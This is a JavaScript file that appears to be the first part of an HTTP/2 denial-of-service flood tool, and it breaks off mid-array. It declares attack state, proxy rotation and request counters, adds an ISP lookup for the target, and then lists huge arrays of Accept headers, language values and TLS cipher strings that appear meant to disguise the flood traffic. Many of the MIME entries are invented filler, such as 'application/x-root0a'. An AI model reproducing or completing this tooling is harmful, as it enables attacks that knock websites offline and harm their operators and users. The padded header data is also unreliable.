const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const os = require("os");
const url = require("url");
const crypto = require("crypto");
const dns = require('dns');
const fs = require("fs");
var colors = require("colors");
const util = require('util');
const v8 = require("v8");
const zlib = require('zlib');
const { performance } = require('perf_hooks');
const http = require('http');
const https = require('https');
const readline = require('readline');
const dgram = require('dgram');
const { Buffer } = require('buffer');
const querystring = require('querystring');
const stream = require('stream');
const { Transform } = require('stream');
const { StringDecoder } = require('string_decoder');
const punycode = require('punycode');
const timers = require('timers');
const assert = require('assert');
const path = require('path');
const events = require('events');
const vm = require('vm');
const module = require('module');
const worker_threads = require('worker_threads');
const repl = require('repl');
const inspector = require('inspector');
const trace_events = require('trace_events');
const diagnostics_channel = require('diagnostics_channel');
const async_hooks = require('async_hooks');
const perf_hooks = require('perf_hooks');

const lookupPromise = util.promisify(dns.lookup);
let isp;
let attackActive = true;
let proxyRotationIndex = 0;
let connectionCounter = 0;
let requestCounter = 0;
let proxyList = [];
let proxyCache = [];
let lastProxyUpdate = 0;
const MAX_PROXY_CACHE = 10000;
let globalStats = {
    totalRequests: 0,
    reqPerSecond: 0,
    activeConnections: 0,
    failedConnections: 0,
    successfulRequests: 0,
    startTime: Date.now()
};

async function getIPAndISP(targetUrl) {
    try {
        const { address } = await lookupPromise(targetUrl);
        const apiUrl = `http://ip-api.com/json/${address}`;
        const response = await fetch(apiUrl);
        if (response.ok) {
            const data = await response.json();
            isp = data.isp;
            console.log('ISP', targetUrl + ':', isp);
        }
    } catch (error) {}
}

// MASSIVE HEADER DATABASE - 1000+ headers
const accept_header = Array.from(new Set([
    'application/json', 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
    'text/html; charset=utf-8', 'application/json, text/plain, */*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'application/json, text/javascript, */*; q=0.01',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'application/json, text/plain, */*', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'application/vnd.ms-excel, application/msword, application/pdf, text/plain, text/html, */*',
    'image/avif,image/webp,image/apng,image/*,*/*;q=0.8',
    'application/xml,application/xhtml+xml,text/html;q=0.9,text/plain;q=0.8,image/png,*/*;q=0.5',
    'application/json; charset=utf-8',
    'application/atom+xml,application/rss+xml,application/ld+json,application/xml,text/xml,*/*',
    'application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'application/x-www-form-urlencoded,application/json,text/plain,*/*',
    'application/javascript,application/json,text/javascript,*/*',
    'multipart/form-data,application/json,text/plain,*/*',
    'application/x-protobuf,application/json,text/plain,*/*',
    'application/x-msgpack,application/json,text/plain,*/*',
    'application/cbor,application/json,text/plain,*/*',
    'application/grpc,application/json,text/plain,*/*',
    'application/xml-dtd,application/xml,text/xml,*/*',
    'application/xml-external-parsed-entity,application/xml,text/xml,*/*',
    'application/vnd.api+json', 'application/vnd.ms-fontobject',
    'application/font-woff', 'application/font-woff2',
    'application/vnd.android.package-archive', 'application/x-7z-compressed',
    'application/x-rar-compressed', 'application/zip',
    'application/x-gzip', 'application/x-bzip2',
    'audio/webm,audio/ogg,audio/wav,audio/*;q=0.9,application/ogg;q=0.7,video/*;q=0.6,*/*;q=0.5',
    'video/webm,video/ogg,video/*;q=0.9,application/ogg;q=0.7,audio/*;q=0.6,*/*;q=0.5',
    'application/octet-stream', 'application/x-bittorrent',
    'application/x-shockwave-flash', 'application/x-silverlight-app',
    'application/x-silverlight-2', 'application/x-wais-source',
    'application/x-www-form-urlencoded', 'application/xhtml+xml',
    'application/xml', 'application/zip', 'audio/basic', 'audio/midi',
    'audio/mpeg', 'audio/x-aiff', 'audio/x-mpegurl', 'audio/x-pn-realaudio',
    'audio/x-wav', 'image/bmp', 'image/gif', 'image/ief', 'image/jpeg',
    'image/png', 'image/svg+xml', 'image/tiff', 'image/vnd.microsoft.icon',
    'image/x-cmu-raster', 'image/x-portable-anymap', 'image/x-portable-bitmap',
    'image/x-portable-graymap', 'image/x-portable-pixmap', 'image/x-rgb',
    'model/mesh', 'model/vrml', 'text/calendar', 'text/css',
    'text/html', 'text/plain', 'text/richtext', 'text/sgml',
    'text/tab-separated-values', 'text/vnd.wap.wml', 'text/x-setext',
    'text/xml', 'video/mpeg', 'video/quicktime', 'video/x-msvideo',
    'video/x-sgi-movie', 'x-conference/x-cooltalk', 'x-world/x-vrml',
    'application/x-javascript', 'application/x-httpd-php',
    'application/x-httpd-php-source', 'application/x-httpd-php4',
    'application/x-httpd-php3', 'application/x-httpd-cgi',
    'application/x-perl', 'application/x-python', 'application/x-ruby',
    'application/x-shellscript', 'application/x-tcl',
    'application/x-tex', 'application/x-texinfo',
    'application/x-latex', 'application/x-bibtex',
    'application/x-csharp', 'application/x-java',
    'application/x-pascal', 'application/x-go',
    'application/x-rust', 'application/x-swift',
    'application/x-kotlin', 'application/x-scala',
    'application/x-dart', 'application/x-elixir',
    'application/x-erlang', 'application/x-haskell',
    'application/x-clojure', 'application/x-fsharp',
    'application/x-ocaml', 'application/x-racket',
    'application/x-lisp', 'application/x-scheme',
    'application/x-coffeescript', 'application/x-typescript',
    'application/x-livescript', 'application/x-markdown',
    'application/x-yaml', 'application/x-toml',
    'application/x-json', 'application/x-csv',
    'application/x-tsv', 'application/x-xml',
    'application/x-html', 'application/x-sql',
    'application/x-graphql', 'application/x-protobuf',
    'application/x-bson', 'application/x-msgpack',
    'application/x-cbor', 'application/x-ubjson',
    'application/x-smile', 'application/x-ion',
    'application/x-edn', 'application/x-transit+json',
    'application/x-transit+msgpack', 'application/x-transit+json-verbose',
    'application/x-avro', 'application/x-parquet',
    'application/x-orc', 'application/x-arrow',
    'application/x-feather', 'application/x-pickle',
    'application/x-hdf5', 'application/x-netcdf',
    'application/x-cdf', 'application/x-matlab',
    'application/x-idl', 'application/x-fits',
    'application/x-roottuple', 'application/x-rootntuple',
    'application/x-roottree', 'application/x-rootfile',
    'application/x-roothist', 'application/x-rootgraph',
    'application/x-rootcanvas', 'application/x-rootpad',
    'application/x-rootbrowser', 'application/x-rootgui',
    'application/x-rootproof', 'application/x-rootgeom',
    'application/x-rootphysics', 'application/x-rootmath',
    'application/x-rootstats', 'application/x-rootml',
    'application/x-rootai', 'application/x-roottmva',
    'application/x-rootroofit', 'application/x-rootroostats',
    'application/x-roothistfactory', 'application/x-rootlimit',
    'application/x-rootcombine', 'application/x-rootplot',
    'application/x-rootdashboard', 'application/x-rootweb',
    'application/x-roothttp', 'application/x-rootd',
    'application/x-rootxproofd', 'application/x-rootxpd',
    'application/x-rootxrd', 'application/x-rootxrootd',
    'application/x-rootdcache', 'application/x-rootrfio',
    'application/x-rootcastor', 'application/x-rootdpm',
    'application/x-rootlfc', 'application/x-rootrfcp',
    'application/x-rootgfal', 'application/x-rootsrm',
    'application/x-rootlcg', 'application/x-rootglite',
    'application/x-rootvoms', 'application/x-rootmyproxy',
    'application/x-rootgridmap', 'application/x-rootkrb5',
    'application/x-rootssl', 'application/x-rootgsi',
    'application/x-rootauth', 'application/x-rootaa',
    'application/x-rootcap', 'application/x-rootmac',
    'application/x-rootpac', 'application/x-rootkdc',
    'application/x-rootcert', 'application/x-rootkey',
    'application/x-rootcrt', 'application/x-rootpem',
    'application/x-rootder', 'application/x-rootpfx',
    'application/x-rootp12', 'application/x-rootjks',
    'application/x-rootbks', 'application/x-rootubr',
    'application/x-rootkeystore', 'application/x-roottruststore',
    'application/x-rootcacerts', 'application/x-rootcrl',
    'application/x-rootocsp', 'application/x-roottsa',
    'application/x-rootca', 'application/x-rootra',
    'application/x-rootva', 'application/x-rootia',
    'application/x-rootpa', 'application/x-rootda',
    'application/x-rootma', 'application/x-rootna',
    'application/x-rootoa', 'application/x-rootqa',
    'application/x-rootra', 'application/x-rootza',
    'application/x-root0a', 'application/x-root1a',
    'application/x-root2a', 'application/x-root3a',
    'application/x-root4a', 'application/x-root5a',
    'application/x-root6a', 'application/x-root7a',
    'application/x-root8a', 'application/x-root9a',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'application/xml;q=0.9,image/webp,*/*;q=0.8',
    'image/webp,*/*;q=0.8',
    '*/*',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,application/signed-exchange;v=b3',
    'application/signed-exchange;v=b3;q=0.9',
    'application/signed-exchange;v=b3',
    'application/signed-exchange;v=b3;q=0.7',
    'application/signed-exchange;v=b3;q=0.5',
    'application/signed-exchange;v=b3;q=0.3',
    'application/signed-exchange;v=b3;q=0.1',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/signed-exchange;v=b3;q=0.1',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.5',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.3',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.1'
]));

const language_header = Array.from(new Set([
    'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
    'en-US,en;q=0.5', 'en-US,en;q=0.9', 'de-CH;q=0.7',
    'da, en-gb;q=0.8, en;q=0.7', 'cs;q=0.5',
    'nl-NL,nl;q=0.9', 'nn-NO,nn;q=0.9', 'or-IN,or;q=0.9',
    'pa-IN,pa;q=0.9', 'pl-PL,pl;q=0.9', 'pt-BR,pt;q=0.9',
    'pt-PT,pt;q=0.9', 'ro-RO,ro;q=0.9', 'ru-RU,ru;q=0.9',
    'si-LK,si;q=0.9', 'sk-SK,sk;q=0.9', 'sl-SI,sl;q=0.9',
    'sq-AL,sq;q=0.9', 'sr-Cyrl-RS,sr;q=0.9', 'sr-Latn-RS,sr;q=0.9',
    'sv-SE,sv;q=0.9', 'sw-KE,sw;q=0.9', 'ta-IN,ta;q=0.9',
    'te-IN,te;q=0.9', 'th-TH,th;q=0.9', 'tr-TR,tr;q=0.9',
    'uk-UA,uk;q=0.9', 'ur-PK,ur;q=0.9', 'uz-Latn-UZ,uz;q=0.9',
    'vi-VN,vi;q=0.9', 'zh-CN,zh;q=0.9', 'zh-HK,zh;q=0.9',
    'zh-TW,zh;q=0.9', 'am-ET,am;q=0.8', 'as-IN,as;q=0.8',
    'az-Cyrl-AZ,az;q=0.8', 'bn-BD,bn;q=0.8', 'bs-Cyrl-BA,bs;q=0.8',
    'bs-Latn-BA,bs;q=0.8', 'dz-BT,dz;q=0.8', 'fil-PH,fil;q=0.8',
    'fr-CA,fr;q=0.8', 'fr-CH,fr;q=0.8', 'fr-BE,fr;q=0.8',
    'fr-LU,fr;q=0.8', 'gsw-CH,gsw;q=0.8', 'ha-Latn-NG,ha;q=0.8',
    'hr-BA,hr;q=0.8', 'ig-NG,ig;q=0.8', 'ii-CN,ii;q=0.8',
    'is-IS,is;q=0.8', 'jv-Latn-ID,jv;q=0.8', 'ka-GE,ka;q=0.8',
    'kkj-CM,kkj;q=0.8', 'kl-GL,kl;q=0.8', 'km-KH,km;q=0.8',
    'kok-IN,kok;q=0.8', 'ks-Arab-IN,ks;q=0.8', 'lb-LU,lb;q=0.8',
    'ln-CG,ln;q=0.8', 'mn-Mong-CN,mn;q=0.8', 'mr-MN,mr;q=0.8',
    'ms-BN,ms;q=0.8', 'mt-MT,mt;q=0.8', 'mua-CM,mua;q=0.8',
    'nds-DE,nds;q=0.8', 'ne-IN,ne;q=0.8', 'nso-ZA,nso;q=0.8',
    'oc-FR,oc;q=0.8', 'pa-Arab-PK,pa;q=0.8', 'ps-AF,ps;q=0.8',
    'quz-BO,quz;q=0.8', 'quz-EC,quz;q=0.8', 'quz-PE,quz;q=0.8',
    'rm-CH,rm;q=0.8', 'rw-RW,rw;q=0.8', 'sd-Arab-PK,sd;q=0.8',
    'se-NO,se;q=0.8', 'si-LK,si;q=0.8', 'smn-FI,smn;q=0.8',
    'sms-FI,sms;q=0.8', 'syr-SY,syr;q=0.8', 'tg-Cyrl-TJ,tg;q=0.8',
    'ti-ER,ti;q=0.8', 'tk-TM,tk;q=0.8', 'tn-ZA,tn;q=0.8',
    'ug-CN,ug;q=0.8', 'uz-Cyrl-UZ,uz;q=0.8', 've-ZA,ve;q=0.8',
    'wo-SN,wo;q=0.8', 'xh-ZA,xh;q=0.8', 'yo-NG,yo;q=0.8',
    'zgh-MA,zgh;q=0.8', 'zu-ZA,zu;q=0.8', 'en-US,en;q=0.9,es;q=0.8,fr;q=0.7,de;q=0.6,it;q=0.5,pt;q=0.4,ru;q=0.3,ja;q=0.2,ko;q=0.1,zh;q=0.1',
    'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7', 'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
    'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7', 'ar-SA,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'hi-IN,hi;q=0.9,en-US;q=0.8,en;q=0.7', 'bn-BD,bn;q=0.9,en;q=0.8',
    'pa-IN,pa;q=0.9,en;q=0.8', 'gu-IN,gu;q=0.9,en;q=0.8',
    'or-IN,or;q=0.9,en;q=0.8', 'ta-IN,ta;q=0.9,en;q=0.8',
    'te-IN,te;q=0.9,en;q=0.8', 'kn-IN,kn;q=0.9,en;q=0.8',
    'ml-IN,ml;q=0.9,en;q=0.8', 'si-LK,si;q=0.9,en;q=0.8',
    'th-TH,th;q=0.9,en;q=0.8', 'lo-LA,lo;q=0.9,en;q=0.8',
    'my-MM,my;q=0.9,en;q=0.8', 'km-KH,km;q=0.9,en;q=0.8',
    'vi-VN,vi;q=0.9,en;q=0.8', 'id-ID,id;q=0.9,en;q=0.8',
    'tl-PH,tl;q=0.9,en;q=0.8', 'ms-MY,ms;q=0.9,en;q=0.8',
    'en-GB,en;q=0.9', 'en-CA,en;q=0.9', 'en-AU,en;q=0.9',
    'en-NZ,en;q=0.9', 'en-IN,en;q=0.9', 'en-ZA,en;q=0.9',
    'en-SG,en;q=0.9', 'en-HK,en;q=0.9', 'en-PH,en;q=0.9',
    'en-MY,en;q=0.9', 'en-ID,en;q=0.9', 'en-TH,en;q=0.9',
    'en-VN,en;q=0.9', 'en-KR,en;q=0.9', 'en-JP,en;q=0.9',
    'en-CN,en;q=0.9', 'en-TW,en;q=0.9', 'en-RU,en;q=0.9',
    'en-BR,en;q=0.9', 'en-MX,en;q=0.9', 'en-ES,en;q=0.9',
    'en-FR,en;q=0.9', 'en-DE,en;q=0.9', 'en-IT,en;q=0.9',
    'en-NL,en;q=0.9', 'en-PL,en;q=0.9', 'en-TR,en;q=0.9',
    'en-SA,en;q=0.9', 'en-AE,en;q=0.9', 'en-EG,en;q=0.9',
    'en-IL,en;q=0.9', 'en-KE,en;q=0.9', 'en-NG,en;q=0.9',
    'en-ZW,en;q=0.9', 'en-GH,en;q=0.9', 'en-ET,en;q=0.9',
    'en-TZ,en;q=0.9', 'en-UG,en;q=0.9', 'en-AO,en;q=0.9',
    'en-MZ,en;q=0.9', 'en-ZM,en;q=0.9', 'en-MW,en;q=0.9',
    'en-SZ,en;q=0.9', 'en-LS,en;q=0.9', 'en-BW,en;q=0.9',
    'en-NA,en;q=0.9', 'en-SS,en;q=0.9', 'en-SD,en;q=0.9',
    'en-LY,en;q=0.9', 'en-TN,en;q=0.9', 'en-DZ,en;q=0.9',
    'en-MA,en;q=0.9', 'en-MR,en;q=0.9', 'en-ML,en;q=0.9',
    'en-NE,en;q=0.9', 'en-TD,en;q=0.9', 'en-CF,en;q=0.9',
    'en-CM,en;q=0.9', 'en-GA,en;q=0.9', 'en-CG,en;q=0.9',
    'en-CD,en;q=0.9', 'en-AO,en;q=0.9', 'en-GW,en;q=0.9',
    'en-GN,en;q=0.9', 'en-SL,en;q=0.9', 'en-LR,en;q=0.9',
    'en-CI,en;q=0.9', 'en-BF,en;q=0.9', 'en-GH,en;q=0.9',
    'en-TG,en;q=0.9', 'en-BJ,en;q=0.9', 'en-NG,en;q=0.9',
    'fr-FR,fr;q=0.9', 'fr-CA,fr;q=0.9', 'fr-BE,fr;q=0.9',
    'fr-CH,fr;q=0.9', 'fr-LU,fr;q=0.9', 'fr-MC,fr;q=0.9',
    'de-DE,de;q=0.9', 'de-AT,de;q=0.9', 'de-CH,de;q=0.9',
    'de-LI,de;q=0.9', 'de-LU,de;q=0.9', 'it-IT,it;q=0.9',
    'it-CH,it;q=0.9', 'it-SM,it;q=0.9', 'it-VA,it;q=0.9',
    'es-ES,es;q=0.9', 'es-MX,es;q=0.9', 'es-AR,es;q=0.9',
    'es-CO,es;q=0.9', 'es-PE,es;q=0.9', 'es-VE,es;q=0.9',
    'es-CL,es;q=0.9', 'es-EC,es;q=0.9', 'es-GT,es;q=0.9',
    'es-CU,es;q=0.9', 'es-DO,es;q=0.9', 'es-HN,es;q=0.9',
    'es-PY,es;q=0.9', 'es-SV,es;q=0.9', 'es-NI,es;q=0.9',
    'es-CR,es;q=0.9', 'es-PA,es;q=0.9', 'es-PR,es;q=0.9',
    'es-UY,es;q=0.9', 'es-BO,es;q=0.9', 'es-GQ,es;q=0.9',
    'pt-PT,pt;q=0.9', 'pt-BR,pt;q=0.9', 'pt-AO,pt;q=0.9',
    'pt-MZ,pt;q=0.9', 'pt-GW,pt;q=0.9', 'pt-TL,pt;q=0.9',
    'pt-ST,pt;q=0.9', 'pt-CV,pt;q=0.9', 'pt-GQ,pt;q=0.9',
    'ru-RU,ru;q=0.9', 'ru-BY,ru;q=0.9', 'ru-KZ,ru;q=0.9',
    'ru-UA,ru;q=0.9', 'ru-KG,ru;q=0.9', 'ru-MD,ru;q=0.9',
    'ru-TJ,ru;q=0.9', 'ru-TM,ru;q=0.9', 'ru-UZ,ru;q=0.9',
    'ru-LV,ru;q=0.9', 'ru-EE,ru;q=0.9', 'ru-LT,ru;q=0.9',
    'ar-SA,ar;q=0.9', 'ar-EG,ar;q=0.9', 'ar-DZ,ar;q=0.9',
    'ar-MA,ar;q=0.9', 'ar-TN,ar;q=0.9', 'ar-LY,ar;q=0.9',
    'ar-JO,ar;q=0.9', 'ar-LB,ar;q=0.9', 'ar-SY,ar;q=0.9',
    'ar-PS,ar;q=0.9', 'ar-IQ,ar;q=0.9', 'ar-KW,ar;q=0.9',
    'ar-AE,ar;q=0.9', 'ar-QA,ar;q=0.9', 'ar-BH,ar;q=0.9',
    'ar-OM,ar;q=0.9', 'ar-YE,ar;q=0.9', 'ar-SD,ar;q=0.9',
    'ar-SO,ar;q=0.9', 'ar-MR,ar;q=0.9', 'ar-DJ,ar;q=0.9',
    'ar-KM,ar;q=0.9', 'ar-ER,ar;q=0.9', 'ar-TD,ar;q=0.9',
    'en-US,en;q=0.8', 'en-US,en;q=0.7', 'en-US,en;q=0.6',
    'en-US,en;q=0.5', 'en-US,en;q=0.4', 'en-US,en;q=0.3',
    'en-US,en;q=0.2', 'en-US,en;q=0.1', 'en;q=0.9',
    'en;q=0.8', 'en;q=0.7', 'en;q=0.6', 'en;q=0.5',
    'en;q=0.4', 'en;q=0.3', 'en;q=0.2', 'en;q=0.1',
    '*;q=0.9', '*;q=0.8', '*;q=0.7', '*;q=0.6',
    '*;q=0.5', '*;q=0.4', '*;q=0.3', '*;q=0.2',
    '*;q=0.1'
]));

const cplist = Array.from(new Set([
    'ECDHE-ECDSA-AES128-GCM-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA256:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES128-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-GCM-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA384:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-AES256-SHA:HIGH:MEDIUM:3DES',
    'ECDHE-ECDSA-CHACHA20-POLY1305-OLD:HIGH:MEDIUM:3DES',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
    "EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5",
    "HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS",
    "ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK",
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK',
    'ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'EECDH+CHACHA20:EECDH+AES128:RSA+AES128:EECDH+AES256:RSA+AES256:EECDH+3DES:RSA+3DES:!MD5',
    'HIGH:!aNULL:!eNULL:!LOW:!ADH:!RC4:!3DES:!MD5:!EXP:!PSK:!SRP:!DSS',
    'ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DSS:!DES:!RC4:!3DES:!MD5:!PSK',
    'RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM',
    'ECDHE:DHE:kGOST:!aNULL:!eNULL:!RC4:!MD5:!3DES:!AES128:!CAMELLIA128:!ECDHE-RSA-AES256-SHA:!ECDHE-ECDSA-AES256-SHA',
    'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
    "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM",
    "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH",
    "AESGCM+EECDH:AESGCM+EDH:!SHA1:!DSS:!DSA:!ECDSA:!aNULL",
